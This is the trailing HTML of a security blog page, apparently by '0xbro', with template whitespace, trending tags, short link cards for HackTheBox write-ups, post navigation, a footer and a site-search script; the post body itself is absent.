    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        



  <section>
    <h2 class="panel-heading">Trending Tags</h2>
    <div class="d-flex flex-wrap mt-3 mb-1 me-3">
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/hackthebox/">hackthebox</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/deserialization/">deserialization</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/android/">android</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/php/">PHP</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/interview/">interview</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/oscp/">OSCP</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/podcast/">podcast</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/ato/">ATO</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/hacking-lab/">hacking-lab</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/note-taking/">note-taking</a>
      
    </div>
  </section>


            </div>

            
              
              






  <div class="toc-border-cover z-3"></div>
  <section id="toc-wrapper" class="invisible position-sticky ps-0 pe-4 pb-4">
    <h2 class="panel-heading ps-3 pb-2 mb-0">Contents</h2>
    <nav id="toc"></nav>
  </section>


            
          </aside>
        </div>

        <div class="row">
          <!-- tail -->
          <div id="tail-wrapper" class="col-12 col-lg-11 col-xl-9 px-md-4">
            
              
              <!-- Recommend the other 3 posts according to the tags and categories of the current post. -->

<!-- The total size of related posts -->


<!-- An random integer that bigger than 0 -->


<!-- Equals to TAG_SCORE / {max_categories_hierarchy} -->















  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  
    
  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  











  <aside id="related-posts" aria-labelledby="related-label">
    <h3 class="mb-4" id="related-label">Further Reading</h3>
    <nav class="row row-cols-1 row-cols-md-2 row-cols-xl-3 g-4 mb-4">
      
        <article class="col">
          <a href="/posts/scriptkiddie/" class="post-preview card h-100">
            <div class="card-body">
              <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->




<time
  
  data-ts="1622844000"
  data-df="ll"
  
>
  Jun  5, 2021
</time>

              <h4 class="pt-0 my-2">HackTheBox - ScriptKiddie</h4>
              <div class="text-muted">
                <p>ScriptKiddie is an easy difficulty Linux HackTheBox machine based on known vulnerabilities for traditional hacking tools.</p>
              </div>
            </div>
          </a>
        </article>
      
        <article class="col">
          <a href="/posts/delivery/" class="post-preview card h-100">
            <div class="card-body">
              <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->




<time
  
  data-ts="1621634400"
  data-df="ll"
  
>
  May 22, 2021
</time>

              <h4 class="pt-0 my-2">HackTheBox - Delivery</h4>
              <div class="text-muted">
                <p>Introduction Delivery is an easy difficulty Linux machine based on web sites enumeration and putting the pieces together in order to abuse a â€œby-designâ€ function and get access to a restricted area...</p>
              </div>
            </div>
          </a>
        </article>
      
        <article class="col">
          <a href="/posts/ready/" class="post-preview card h-100">
            <div class="card-body">
              <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->




<time
  
  data-ts="1620943200"
  data-df="ll"
  
>
  May 14, 2021
</time>

              <h4 class="pt-0 my-2">HackTheBox - Ready</h4>
              <div class="text-muted">
                <p>HackTheBox &quot;Ready&quot; wirteup is now available!</p>
              </div>
            </div>
          </a>
        </article>
      
    </nav>
  </aside>
  <!-- #related-posts -->


            
              
              <!-- Navigation buttons at the bottom of the post. -->

<nav class="post-navigation d-flex justify-content-between" aria-label="Post Navigation">
  
  

  
    <a
      href="/posts/admirertoo/"
      class="btn btn-outline-primary"
      aria-label="Older"
    >
      <p>HackTheBox - AdmirerToo</p>
    </a>
  

  
    <a
      href="/posts/blunder/"
      class="btn btn-outline-primary"
      aria-label="Newer"
    >
      <p>HackTheBox - Blunder</p>
    </a>
  
</nav>

            

            <footer
  aria-label="Site Info"
  class="
    d-flex flex-column justify-content-center text-muted
    flex-lg-row justify-content-lg-between align-items-lg-center pb-lg-3
  "
>
  <p>Â©
    <time>2026</time>

    
      <a href="https://github.com/0xb120">0xbro</a>.
    

    
      <span
        data-bs-toggle="tooltip"
        data-bs-placement="top"
        title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author."
      >Some rights reserved.</span>
    
  </p>

  <p>
   Powered by â˜•, ðŸ›ðŸœðŸž, vulnerabilities and exploits
  </p>
</footer>
          </div>
        </div>

        <!-- The Search results -->

<div id="search-result-wrapper" class="d-flex justify-content-center d-none">
  <div class="col-11 content">
    <div id="search-hints">
      <!-- The trending tags list -->















  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        



  <section>
    <h2 class="panel-heading">Trending Tags</h2>
    <div class="d-flex flex-wrap mt-3 mb-1 me-3">
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/hackthebox/">hackthebox</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/deserialization/">deserialization</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/android/">android</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/php/">PHP</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/interview/">interview</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/oscp/">OSCP</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/podcast/">podcast</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/ato/">ATO</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/hacking-lab/">hacking-lab</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/note-taking/">note-taking</a>
      
    </div>
  </section>


    </div>
    <div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div>
  </div>
</div>

      </div>

      <aside aria-label="Scroll to Top">
        <button id="back-to-top" type="button" class="btn btn-lg btn-box-shadow">
          <i class="fas fa-angle-up"></i>
        </button>
      </aside>
    </div>

    <div id="mask" class="d-none position-fixed w-100 h-100 z-1"></div>

    
      <aside
  id="notification"
  class="toast"
  role="alert"
  aria-live="assertive"
  aria-atomic="true"
  data-bs-animation="true"
  data-bs-autohide="false"
>
  <div class="toast-header">
    <button
      type="button"
      class="btn-close ms-auto"
      data-bs-dismiss="toast"
      aria-label="Close"
    ></button>
  </div>
  <div class="toast-body text-center pt-0">
    <p class="px-2 mb-3">A new version of content is available.</p>
    <button type="button" class="btn btn-primary" aria-label="Update">
      Update
    </button>
  </div>
</aside>

    

    <!-- Embedded scripts -->

    
      
      <!-- The comments switcher -->


    

    <!--
  Jekyll Simple Search loader
  See: <https://github.com/christian-fei/Simple-Jekyll-Search>
-->





<script>
  
  document.addEventListener('DOMContentLoaded', () => {
    SimpleJekyllSearch({
      searchInput: document.getElementById('search-input'),
      resultsContainer: document.getElementById('search-results'),
      json: '/assets/js/data/search.json',
      searchResultTemplate: '  <article class="px-1 px-sm-2 px-lg-4 px-xl-0">    <header>      <h2><a href="{url}">{title}</a></h2>      <div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1">        {categories}        {tags}      </div>    </header>    <p>{content}</p>  </article>',
      noResultsText: '<p class="mt-5">Oops! No results found.</p>',
      templateMiddleware: function(prop, value, template) {
        if (prop === 'categories') {
          if (value === '') {
            return `${value}`;
          } else {
            return `<div class="me-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`;
          }
        }

        if (prop === 'tags') {
          if (value === '') {
            return `${value}`;
          } else {
            return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`;
          }
        }
      }
    });
  });
</script>

  </body>
</html>

